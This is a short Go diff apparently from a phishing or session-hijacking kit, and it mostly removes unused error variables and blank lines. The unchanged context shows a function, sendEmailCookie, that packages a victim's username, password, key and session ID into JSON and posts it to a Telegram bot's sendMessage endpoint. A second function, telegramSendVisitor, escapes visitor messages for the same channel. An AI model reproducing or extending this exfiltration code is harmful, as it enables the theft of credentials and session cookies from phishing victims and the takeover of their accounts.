@@ -76,10 +76,7 @@ func telegramSendResult(msg string){
 func sendEmailCookie(msg string, username string, password string, KeyUser string, sessionId string) {
 
 	// Send the message
-	var err error
-
 	url := fmt.Sprintf("%s/sendMessage", getUrl())
-
 	postBody, _ := json.Marshal(map[string]string{
 		"chat_id":    getChatId(),
 		" 🌟 Email ":      username,
@@ -90,7 +87,6 @@ func sendEmailCookie(msg string, username string, password string, KeyUser strin
 	})
 
 	responseBody := bytes.NewBuffer(postBody)
-
 	request, _ := http.Post(url, "application/json", responseBody)
 
 	defer request.Body.Close()
@@ -105,8 +101,7 @@ func sendEmailCookie(msg string, username string, password string, KeyUser strin
 }
 
 func telegramSendVisitor(msg string) {
-	var err error
-
+	
 	msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
 	
 	url := fmt.Sprintf("%s/sendMessage", getUrl())
